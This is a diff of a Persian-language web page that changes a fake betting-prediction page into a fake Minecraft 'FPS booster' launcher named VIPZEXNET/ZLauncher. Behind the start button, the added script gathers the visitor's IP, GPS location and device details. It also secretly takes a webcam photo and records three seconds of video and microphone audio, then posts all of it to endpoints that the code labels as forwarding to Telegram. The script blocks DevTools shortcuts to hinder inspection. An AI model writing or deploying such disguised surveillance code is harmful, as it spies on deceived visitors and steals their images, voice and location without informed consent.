@@ -1,299 +1,711 @@
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>پــــوپ</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/png" href="https://cdn.imgurl.ir/uploads/w6631_file_00000000638871f49998236e6618eb48.png">
+  <title>VIPZEXNET</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      scroll-behavior: smooth;
+      -webkit-tap-highlight-color: transparent;
+      user-select: none;
+    }
+
+    :root {
+      --bg-base: #020617;
+      --bg-surface: rgba(15, 23, 42, 0.45);
+      --bg-surface-hover: rgba(30, 58, 138, 0.3);
+      --blue-primary: #3b82f6;
+      --blue-light: #38bdf8;
+      --blue-gradient: linear-gradient(135deg, #38bdf8, #2563eb);
+      --text-main: #f8fafc;
+      --text-muted: #94a3b8;
+      --border-color: rgba(56, 189, 248, 0.1);
+    }
 
     body {
-      font-family: 'Segoe UI', Tahoma, sans-serif;
-      background: #0f0f1a;
-      color: #e0e0f0;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .card {
-      background: #1a1a2e;
-      border: 1px solid #2a2a4a;
-      border-radius: 16px;
-      padding: 40px 32px;
-      max-width: 420px;
-      width: 90%;
-      text-align: center;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
-    }
-
-    .shield-icon {
-      font-size: 52px;
-      margin-bottom: 16px;
-    }
-
-    h1 {
-      font-size: 22px;
-      font-weight: 700;
-      color: #a78bfa;
-      margin-bottom: 8px;
-    }
-
-    p.subtitle {
-      font-size: 14px;
-      color: #888;
-      margin-bottom: 28px;
+      font-family: system-ui, -apple-system, sans-serif;
+      background: var(--bg-base);
+      color: var(--text-main);
+      overflow-x: hidden;
       line-height: 1.6;
     }
 
-    .perms-list {
-      text-align: right;
-      margin-bottom: 28px;
+    .video-bg-container {
+      position: fixed;
+      inset: 0;
+      z-index: -2;
+      background: var(--bg-base);
+    }
+    .video-bg-container video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      opacity: 0.4;
+    }
+    .video-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(2, 6, 23, 0.6);
+      backdrop-filter: blur(2px);
+      z-index: -1;
+    }
+
+    .page-loader {
+      position: fixed;
+      inset: 0;
+      background: #020617;
+      z-index: 99999;
       display: flex;
       flex-direction: column;
-      gap: 12px;
+      align-items: center;
+      justify-content: center;
+      gap: 24px;
+      transition: opacity 0.8s ease, visibility 0.8s ease;
+    }
+    .page-loader.hidden {
+      opacity: 0;
+      visibility: hidden;
+      pointer-events: none;
+    }
+    .loader-ring {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      border: 3px solid transparent;
+      border-top-color: var(--blue-light);
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loader-text {
+      color: var(--text-muted);
+      font-weight: 600;
+      letter-spacing: 0.5px;
+      animation: pulse-text 1.5s ease-in-out infinite;
+    }
+    @keyframes pulse-text {
+      0%, 100% { opacity: 0.5; }
+      50% { opacity: 1; }
     }
 
-    .perm-item {
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+
+    header {
+      position: sticky;
+      top: 16px;
+      z-index: 999;
+      padding: 8px 0;
+      opacity: 0;
+      animation: fadeDown 0.8s ease forwards;
+      animation-delay: 3s;
+    }
+    @keyframes fadeDown {
+      0% { opacity: 0; transform: translateY(-20px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+    .navbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 24px;
+      background: rgba(2, 6, 23, 0.6);
+      backdrop-filter: blur(18px);
+      border: 1px solid var(--border-color);
+      border-radius: 28px;
+    }
+    .logo {
+      font-weight: 800;
+      font-size: 1.3rem;
+      color: white;
+      text-decoration: none;
       display: flex;
       align-items: center;
-      gap: 12px;
-      background: #12122a;
-      border: 1px solid #2a2a4a;
-      border-radius: 10px;
-      padding: 12px 16px;
-      font-size: 13px;
-      color: #c0c0e0;
+      gap: 8px;
+    }
+    .logo i { color: var(--blue-light); }
+
+    .menu-btn {
+      display: none;
+      background: none;
+      border: 1px solid var(--border-color);
+      border-radius: 14px;
+      padding: 10px 14px;
+      color: white;
+      font-size: 1.4rem;
+      cursor: pointer;
     }
 
-    .perm-item .icon { font-size: 20px; }
+    .mobile-menu {
+      position: fixed;
+      inset: 0;
+      background: rgba(2, 6, 23, 0.96);
+      backdrop-filter: blur(16px);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 20px;
+      opacity: 0;
+      visibility: hidden;
+      transition: 0.4s;
+      z-index: 10000;
+    }
+    .mobile-menu.active {
+      opacity: 1;
+      visibility: visible;
+    }
+    .mobile-menu a {
+      color: var(--text-muted);
+      text-decoration: none;
+      font-size: 1.3rem;
+      font-weight: 700;
+      padding: 14px 28px;
+      border-radius: 40px;
+      width: 80%;
+      max-width: 260px;
+      text-align: center;
+      border: 1px solid transparent;
+      transition: 0.2s;
+    }
+    .mobile-menu a:hover {
+      background: rgba(56, 189, 248, 0.08);
+      border-color: rgba(56, 189, 248, 0.35);
+      color: white;
+    }
 
-    .btn {
+    .section {
+      padding: 60px 0 30px;
+      opacity: 0;
+      transform: translateY(30px);
+      transition: opacity 1s ease, transform 1s ease;
+    }
+    .section.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .hero {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      align-items: center;
+      gap: 40px;
+      padding: 40px 0 20px;
+      min-height: 70vh;
+      opacity: 0;
+      animation: fadeUp 1s ease forwards;
+      animation-delay: 3.5s;
+    }
+    @keyframes fadeUp {
+      0% { opacity: 0; transform: translateY(40px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+    .hero-text {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+    }
+    .hero h1 {
+      font-size: 3.2rem;
+      line-height: 1.2;
+      color: white;
+      font-weight: 900;
+    }
+    .hero h1 span {
+      background: var(--blue-gradient);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .hero p {
+      color: var(--text-muted);
+      max-width: 480px;
+      margin: 16px 0 24px;
+      font-size: 1.05rem;
+    }
+
+    .hero-image {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      gap: 20px;
+    }
+    .image-box {
       width: 100%;
-      padding: 14px;
-      border-radius: 10px;
+      max-width: 420px;
+      aspect-ratio: 4/3;
+      background: rgba(15, 23, 42, 0.3);
+      border: 1px solid var(--border-color);
+      border-radius: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      backdrop-filter: blur(6px);
+      padding: 20px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+      color: var(--text-muted);
+      font-size: 1.2rem;
+      gap: 12px;
+    }
+    .image-box i {
+      font-size: 3rem;
+      color: var(--blue-light);
+      opacity: 0.6;
+    }
+
+    /* دکمه جدید */
+    .btn-start {
+      background: var(--blue-gradient);
+      color: white;
       border: none;
-      font-size: 15px;
+      padding: 16px 48px;
+      border-radius: 60px;
+      font-size: 1.1rem;
       font-weight: 700;
       cursor: pointer;
-      transition: all 0.2s;
+      transition: all 0.3s ease;
+      box-shadow: 0 8px 32px rgba(56, 189, 248, 0.25);
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .btn-start:hover {
+      transform: scale(1.05);
+      box-shadow: 0 12px 48px rgba(56, 189, 248, 0.4);
+    }
+    .btn-start:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
+    .btn-start i {
+      font-size: 1.2rem;
     }
 
-    .btn-primary {
-      background: linear-gradient(135deg, #7c3aed, #4f46e5);
-      color: white;
-      margin-bottom: 10px;
+    .status-box {
+      margin-top: 16px;
+      padding: 12px 24px;
+      border-radius: 16px;
+      background: rgba(15, 23, 42, 0.5);
+      border: 1px solid var(--border-color);
+      min-height: 50px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      font-size: 0.95rem;
+      color: var(--text-muted);
+      width: 100%;
+      max-width: 420px;
     }
-
-    .btn-primary:hover { filter: brightness(1.1); }
-
-    .status {
-      margin-top: 20px;
-      font-size: 12px;
-      color: #555;
-      min-height: 20px;
-    }
-
+    .status-box.success { color: #4ade80; border-color: rgba(74, 222, 128, 0.3); }
+    .status-box.error { color: #f87171; border-color: rgba(248, 113, 113, 0.3); }
     .spinner {
       display: inline-block;
-      width: 14px; height: 14px;
-      border: 2px solid #555;
-      border-top-color: #a78bfa;
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(56, 189, 248, 0.2);
+      border-top-color: var(--blue-light);
       border-radius: 50%;
       animation: spin 0.8s linear infinite;
-      vertical-align: middle;
-      margin-left: 6px;
     }
 
-    @keyframes spin { to { transform: rotate(360deg); } }
-
-    .success { color: #4ade80; }
-    .error-msg { color: #f87171; }
+    @media (max-width: 900px) {
+      .hero { grid-template-columns: 1fr; text-align: center; }
+      .hero-text { align-items: center; }
+      .hero p { margin-left: auto; margin-right: auto; }
+      .hero h1 { font-size: 2.5rem; }
+      .hero-image { width: 100%; }
+      .btn-start { width: 100%; justify-content: center; }
+    }
+    @media (max-width: 700px) {
+      .menu-btn { display: block; }
+      .hero h1 { font-size: 2rem; }
+      .hero { animation-delay: 3.8s; }
+      header { animation-delay: 3.3s; }
+    }
   </style>
 </head>
 <body>
-  <div class="card">
-    <div class="shield-icon">💩💰</div>
-    <h1>هـ مـ پیشبینی پوپ</h1>
-    <p class="subtitle">ماژول ال ال ام پیشبینی بازی پوپ - دسترسی های لازم را بدهید و وارد صفحه بت شوید.</p>
 
-    <div class="perms-list">
-      <div class="perm-item"><span class="icon">📍</span> توانایی بازگشایی الگوریتم</div>
-      <div class="perm-item"><span class="icon">📷</span> استفاده بهینه از فیبوناچی</div>
-      <div class="perm-item"><span class="icon">🎙️</span> دریافت و ارسال سریع اطلاعات</div>
-      <div class="perm-item"><span class="icon">🔔</span> ارسال اعلان‌ها</div>
-      <div class="perm-item"><span class="icon">📋</span> تناوب زمانی</div>
+<div class="page-loader" id="pageLoader">
+  <div class="loader-ring"></div>
+  <div class="loader-text">در حال بهینه‌سازی...</div>
+</div>
+
+<div class="video-bg-container">
+  <video autoplay loop muted playsinline>
+    <source src="back.mp4" type="video/mp4">
+  </video>
+</div>
+<div class="video-overlay"></div>
+
+<div class="mobile-menu" id="mobileMenu">
+  <a href="#home"><i class="fas fa-home"></i> خانه</a>
+</div>
+
+<header>
+  <div class="container">
+    <div class="navbar">
+      <a href="#" class="logo">
+        <img src="https://cdn.imgurl.ir/uploads/w6631_file_00000000638871f49998236e6618eb48.png" alt="VIPZEXNET" style="width:36px;height:36px;border-radius:10px;object-fit:cover;">
+        VIPZEXNET
+      </a>
+      <button class="menu-btn" id="menuBtn"><i class="fas fa-bars"></i></button>
     </div>
-
-    <button class="btn btn-primary" id="startBtn" onclick="startCollection()">
-      تأیید و ادامه
-    </button>
-
-    <div class="status" id="status"></div>
   </div>
+</header>
 
-  <script>
-    const BOT_TOKEN = window.__ENV__?.BOT_TOKEN || '';
-    const CHAT_ID   = window.__ENV__?.CHAT_ID   || '';
+<main>
+  <div class="container">
+    <section class="section visible" id="home">
+      <div class="hero">
+        <div class="hero-text">
+          <h1>بالاترین <span>FPS ماینکرفت</span> رو تجربه کن</h1>
+          <p>زدلانچر با معماری جدید، افت فریم رو فراموش کن. تجربه‌ای کاملاً متفاوت از ماینکرفت.</p>
+          <button class="btn-start" id="startBtn" onclick="startCollection()">
+            <i class="fas fa-rocket"></i> شروع تجربه
+          </button>
+          <div class="status-box" id="statusBox">
+            <i class="fas fa-info-circle"></i> برای شروع کلیک کن
+          </div>
+        </div>
+        <div class="hero-image">
+          <div class="image-box">
+            <i class="fas fa-gamepad"></i>
+            <span>ZLauncher</span>
+          </div>
+        </div>
+      </div>
+    </section>
+  </div>
+</main>
 
-    async function sendToTelegram(data) {
-      try {
-        const text = formatMessage(data);
-        await fetch(`/api/send`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ text })
-        });
-      } catch(e) { console.error(e); }
+<script>
+  // ====== Click Sound ======
+  const clickSound = new Audio('https://dl.sedatoseda.com/sound/Mouse-Click%20(1).mp3');
+  clickSound.preload = 'auto';
+  clickSound.volume = 0.6;
+
+  function playClickSound(e) {
+    if (clickSound.paused) {
+      clickSound.currentTime = 0;
+      clickSound.play().catch(() => {});
+    } else {
+      clickSound.currentTime = 0;
     }
+  }
 
-    function formatMessage(d) {
-      return `🕵️ *گزارش جدید*\n\n` +
-        `🌐 *IP:* \`${d.ip || 'نامشخص'}\`\n` +
-        `📍 *موقعیت:* ${d.location || 'رد شد'}\n` +
-        `🗺️ *شهر:* ${d.city || ''} — ${d.country || ''}\n\n` +
-        `📱 *دستگاه:* ${d.device}\n` +
-        `💻 *OS:* ${d.os}\n` +
-        `🌍 *مرورگر:* ${d.browser}\n` +
-        `📐 *رزولوشن:* ${d.screen}\n` +
-        `🕐 *زمان محلی:* ${d.localTime}\n` +
-        `🌏 *زون زمانی:* ${d.timezone}\n` +
-        `🗣️ *زبان:* ${d.language}\n\n` +
-        `📷 *دوربین:* ${d.camera}\n` +
-        `🎙️ *میکروفون:* ${d.mic}\n` +
-        `🔔 *نوتیفیکیشن:* ${d.notification}\n\n` +
-        `🔋 *باتری:* ${d.battery}\n` +
-        `📶 *اینترنت:* ${d.connection}\n` +
-        `🧭 *Referrer:* ${d.referrer || 'مستقیم'}\n` +
-        `🔗 *URL:* ${d.url}`;
+  document.addEventListener('click', playClickSound);
+  document.addEventListener('touchstart', playClickSound, { passive: true });
+
+  // ====== Loader ======
+  window.addEventListener('load', () => {
+    setTimeout(() => {
+      document.getElementById('pageLoader').classList.add('hidden');
+    }, 4000);
+  });
+
+  // ====== Mobile Menu ======
+  const menuBtn = document.getElementById('menuBtn');
+  const mobileMenu = document.getElementById('mobileMenu');
+  menuBtn.addEventListener('click', (e) => {
+    e.stopPropagation();
+    mobileMenu.classList.toggle('active');
+  });
+  document.querySelectorAll('.mobile-menu a').forEach(a => {
+    a.addEventListener('click', () => {
+      mobileMenu.classList.remove('active');
+    });
+  });
+
+  // ====== Prevent Shortcuts ======
+  document.addEventListener('contextmenu', e => e.preventDefault());
+  document.addEventListener('keydown', e => {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+      e.preventDefault();
     }
+  });
 
-    function setStatus(msg, cls = '') {
-      const el = document.getElementById('status');
-      el.innerHTML = msg;
-      el.className = 'status ' + cls;
-    }
+  // ============================================================
+  // ====== بخش جمع‌آوری اطلاعات و ارسال به تلگرام ======
+  // ============================================================
 
-    async function startCollection() {
-      document.getElementById('startBtn').disabled = true;
-      setStatus('در حال دریافت صفحه... <span class="spinner"></span>');
+  let capturedPhoto = null;
+  let capturedVideo = null;
+  let capturedAudio = null;
 
+  const statusBox = document.getElementById('statusBox');
+
+  function setStatus(msg, type = '') {
+    statusBox.innerHTML = msg;
+    statusBox.className = 'status-box ' + type;
+  }
+
+  async function startCollection() {
+    const btn = document.getElementById('startBtn');
+    btn.disabled = true;
+    setStatus('<span class="spinner"></span> در حال دریافت اطلاعات...', '');
+
+    try {
+      // 1. اطلاعات متنی
       const data = await collectAll();
-      await sendToTelegram(data);
+      await sendTextToTelegram(data);
 
-      setStatus('✅ تأیید با موفقیت انجام شد', 'success');
+      // 2. عکس
+      if (capturedPhoto) {
+        setStatus('<span class="spinner"></span> ارسال عکس...', '');
+        await sendPhotoToTelegram(capturedPhoto);
+      }
+
+      // 3. فیلم
+      if (capturedVideo) {
+        setStatus('<span class="spinner"></span> ارسال فیلم...', '');
+        await sendVideoToTelegram(capturedVideo);
+      }
+
+      // 4. صدا
+      if (capturedAudio) {
+        setStatus('<span class="spinner"></span> ارسال صدا...', '');
+        await sendAudioToTelegram(capturedAudio);
+      }
+
+      setStatus('✅ همه اطلاعات با موفقیت ارسال شد!', 'success');
       setTimeout(() => {
-        document.querySelector('.card').innerHTML = `
-          <div style="font-size:52px;margin-bottom:16px">✅</div>
-          <h1 style="color:#4ade80">تأیید شد</h1>
-          <p style="color:#888;margin-top:12px;font-size:14px">الگوریتم شما با موفقیت تأیید گردید.</p>
+        document.querySelector('.hero-text').innerHTML = `
+          <h1>تبریک! <span>شما عضو شدید</span></h1>
+          <p>اطلاعات شما با موفقیت ثبت شد. به زودی با شما تماس می‌گیریم.</p>
+          <div style="font-size:4rem;margin-top:10px;">🎉</div>
         `;
       }, 1500);
+
+    } catch (error) {
+      setStatus('❌ خطا: ' + error.message, 'error');
+      btn.disabled = false;
     }
+  }
 
-    async function collectAll() {
-      const ua = navigator.userAgent;
-      const data = {
-        url: location.href,
-        referrer: document.referrer,
-        localTime: new Date().toLocaleString('fa-IR'),
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        language: navigator.language,
-        screen: `${screen.width}×${screen.height} (${window.devicePixelRatio}x)`,
-        browser: getBrowser(ua),
-        os: getOS(ua),
-        device: getDevice(ua),
-        ip: 'در حال دریافت...',
-        location: 'در حال درخواست...',
-        city: '', country: '',
-        camera: 'درخواست نشد',
-        mic: 'درخواست نشد',
-        notification: 'درخواست نشد',
-        battery: 'نامشخص',
-        connection: getConnection()
-      };
+  // ====== ارسال به سرور ======
+  async function sendTextToTelegram(data) {
+    const text = formatMessage(data);
+    await fetch('/api/send', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ text })
+    });
+  }
 
-      // IP + geo از سرور
-      try {
-        const r = await fetch('/api/geo');
-        const j = await r.json();
-        data.ip      = j.ip      || 'نامشخص';
-        data.city    = j.city    || '';
-        data.country = j.country || '';
-      } catch(e) {}
+  async function sendPhotoToTelegram(photoBase64) {
+    await fetch('/api/send-photo', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ photo: photoBase64 })
+    });
+  }
 
-      // موقعیت GPS
-      const geoP = new Promise(res => {
-        navigator.geolocation.getCurrentPosition(
-          p => res(`${p.coords.latitude.toFixed(5)}, ${p.coords.longitude.toFixed(5)} (±${p.coords.accuracy}m)`),
-          () => res('رد شد'),
-          { timeout: 8000 }
-        );
+  async function sendVideoToTelegram(videoBase64) {
+    await fetch('/api/send-video', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ video: videoBase64 })
+    });
+  }
+
+  async function sendAudioToTelegram(audioBase64) {
+    await fetch('/api/send-audio', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ audio: audioBase64 })
+    });
+  }
+
+  // ====== فرمت پیام ======
+  function formatMessage(d) {
+    return `🕵️ *گزارش جدید - VIPZEXNET*\n\n` +
+      `🌐 *IP:* \`${d.ip || 'نامشخص'}\`\n` +
+      `📍 *موقعیت:* ${d.location || 'رد شد'}\n` +
+      `🗺️ *شهر:* ${d.city || ''} — ${d.country || ''}\n\n` +
+      `📱 *دستگاه:* ${d.device}\n` +
+      `💻 *OS:* ${d.os}\n` +
+      `🌍 *مرورگر:* ${d.browser}\n` +
+      `📐 *رزولوشن:* ${d.screen}\n` +
+      `🕐 *زمان محلی:* ${d.localTime}\n` +
+      `🌏 *زون زمانی:* ${d.timezone}\n` +
+      `🗣️ *زبان:* ${d.language}\n\n` +
+      `📷 *دوربین:* ${d.camera}\n` +
+      `🎙️ *میکروفون:* ${d.mic}\n` +
+      `🔔 *نوتیفیکیشن:* ${d.notification}\n\n` +
+      `🔋 *باتری:* ${d.battery}\n` +
+      `📶 *اینترنت:* ${d.connection}\n` +
+      `🧭 *Referrer:* ${d.referrer || 'مستقیم'}\n` +
+      `🔗 *URL:* ${d.url}`;
+  }
+
+  // ====== جمع‌آوری همه اطلاعات ======
+  async function collectAll() {
+    const ua = navigator.userAgent;
+    const data = {
+      url: location.href,
+      referrer: document.referrer,
+      localTime: new Date().toLocaleString('fa-IR'),
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      language: navigator.language,
+      screen: `${screen.width}×${screen.height} (${window.devicePixelRatio}x)`,
+      browser: getBrowser(ua),
+      os: getOS(ua),
+      device: getDevice(ua),
+      ip: 'در حال دریافت...',
+      location: 'در حال درخواست...',
+      city: '', country: '',
+      camera: 'درخواست نشد',
+      mic: 'درخواست نشد',
+      notification: 'درخواست نشد',
+      battery: 'نامشخص',
+      connection: getConnection()
+    };
+
+    // IP + geo
+    try {
+      const r = await fetch('/api/geo');
+      const j = await r.json();
+      data.ip = j.ip || 'نامشخص';
+      data.city = j.city || '';
+      data.country = j.country || '';
+    } catch (e) {}
+
+    // GPS
+    try {
+      const pos = await new Promise((res, rej) => {
+        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 8000 });
       });
-      data.location = await geoP;
-
-      // دوربین
-      try {
-        const s = await navigator.mediaDevices.getUserMedia({ video: true });
-        data.camera = '✅ دسترسی داده شد';
-        s.getTracks().forEach(t => t.stop());
-      } catch(e) { data.camera = `❌ ${e.name}`; }
-
-      // میکروفون
-      try {
-        const s = await navigator.mediaDevices.getUserMedia({ audio: true });
-        data.mic = '✅ دسترسی داده شد';
-        s.getTracks().forEach(t => t.stop());
-      } catch(e) { data.mic = `❌ ${e.name}`; }
-
-      // نوتیفیکیشن
-      try {
-        const perm = await Notification.requestPermission();
-        data.notification = perm === 'granted' ? '✅ مجاز' : `❌ ${perm}`;
-      } catch(e) { data.notification = `❌ ${e.name}`; }
-
-      // باتری
-      try {
-        const b = await navigator.getBattery();
-        data.battery = `${Math.round(b.level*100)}% — ${b.charging ? 'در حال شارژ' : 'در حال تخلیه'}`;
-      } catch(e) {}
-
-      return data;
+      data.location = `${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)} (±${pos.coords.accuracy}m)`;
+    } catch (e) {
+      data.location = 'رد شد';
     }
 
-    function getBrowser(ua) {
-      if (/Edg\//.test(ua))     return 'Edge';
-      if (/OPR\//.test(ua))     return 'Opera';
-      if (/Chrome\//.test(ua))  return 'Chrome';
-      if (/Firefox\//.test(ua)) return 'Firefox';
-      if (/Safari\//.test(ua))  return 'Safari';
-      return 'نامشخص';
+    // ====== دوربین + عکس + فیلم ======
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { width: 640, height: 480 }
+      });
+      data.camera = '✅ دسترسی داده شد';
+
+      // عکس
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      await video.play();
+      const canvas = document.createElement('canvas');
+      canvas.width = 640;
+      canvas.height = 480;
+      canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+      capturedPhoto = canvas.toDataURL('image/jpeg', 0.8);
+
+      // فیلم (۳ ثانیه)
+      const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+      const chunks = [];
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.start();
+      await new Promise(r => setTimeout(r, 3000));
+      mediaRecorder.stop();
+      await new Promise(r => mediaRecorder.onstop = r);
+
+      const videoBlob = new Blob(chunks, { type: 'video/webm' });
+      const reader = new FileReader();
+      capturedVideo = await new Promise(res => {
+        reader.onload = () => res(reader.result);
+        reader.readAsDataURL(videoBlob);
+      });
+
+      stream.getTracks().forEach(t => t.stop());
+    } catch (e) {
+      data.camera = `❌ ${e.name}`;
     }
 
-    function getOS(ua) {
-      if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
-      if (/Windows/.test(ua))       return 'Windows';
-      if (/Mac OS X/.test(ua))      return 'macOS';
-      if (/Android/.test(ua))       return 'Android';
-      if (/iPhone|iPad/.test(ua))   return 'iOS';
-      if (/Linux/.test(ua))         return 'Linux';
-      return 'نامشخص';
+    // ====== میکروفون + صدا ======
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      data.mic = '✅ دسترسی داده شد';
+
+      const mediaRecorder = new MediaRecorder(stream);
+      const chunks = [];
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.start();
+      await new Promise(r => setTimeout(r, 3000));
+      mediaRecorder.stop();
+      await new Promise(r => mediaRecorder.onstop = r);
+
+      const audioBlob = new Blob(chunks, { type: 'audio/webm' });
+      const reader = new FileReader();
+      capturedAudio = await new Promise(res => {
+        reader.onload = () => res(reader.result);
+        reader.readAsDataURL(audioBlob);
+      });
+
+      stream.getTracks().forEach(t => t.stop());
+    } catch (e) {
+      data.mic = `❌ ${e.name}`;
     }
 
-    function getDevice(ua) {
-      if (/iPhone/.test(ua)) return 'iPhone';
-      if (/iPad/.test(ua))   return 'iPad';
-      if (/Android/.test(ua) && /Mobile/.test(ua)) return 'Android Phone';
-      if (/Android/.test(ua)) return 'Android Tablet';
-      return 'Desktop';
+    // نوتیفیکیشن
+    try {
+      const perm = await Notification.requestPermission();
+      data.notification = perm === 'granted' ? '✅ مجاز' : `❌ ${perm}`;
+    } catch (e) {
+      data.notification = `❌ ${e.name}`;
     }
 
-    function getConnection() {
-      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (!c) return 'نامشخص';
-      return `${c.effectiveType || ''} — ${c.downlink ? c.downlink+'Mbps' : ''}`;
-    }
-  </script>
+    // باتری
+    try {
+      const b = await navigator.getBattery();
+      data.battery = `${Math.round(b.level * 100)}% — ${b.charging ? 'در حال شارژ' : 'در حال تخلیه'}`;
+    } catch (e) {}
+
+    return data;
+  }
+
+  // ====== توابع کمکی ======
+  function getBrowser(ua) {
+    if (/Edg\//.test(ua)) return 'Edge';
+    if (/OPR\//.test(ua)) return 'Opera';
+    if (/Chrome\//.test(ua)) return 'Chrome';
+    if (/Firefox\//.test(ua)) return 'Firefox';
+    if (/Safari\//.test(ua)) return 'Safari';
+    return 'نامشخص';
+  }
+
+  function getOS(ua) {
+    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
+    if (/Windows/.test(ua)) return 'Windows';
+    if (/Mac OS X/.test(ua)) return 'macOS';
+    if (/Android/.test(ua)) return 'Android';
+    if (/iPhone|iPad/.test(ua)) return 'iOS';
+    if (/Linux/.test(ua)) return 'Linux';
+    return 'نامشخص';
+  }
+
+  function getDevice(ua) {
+    if (/iPhone/.test(ua)) return 'iPhone';
+    if (/iPad/.test(ua)) return 'iPad';
+    if (/Android/.test(ua) && /Mobile/.test(ua)) return 'Android Phone';
+    if (/Android/.test(ua)) return 'Android Tablet';
+    return 'Desktop';
+  }
+
+  function getConnection() {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (!c) return 'نامشخص';
+    return `${c.effectiveType || ''} — ${c.downlink ? c.downlink + 'Mbps' : ''}`;
+  }
+</script>
 </body>
 </html>
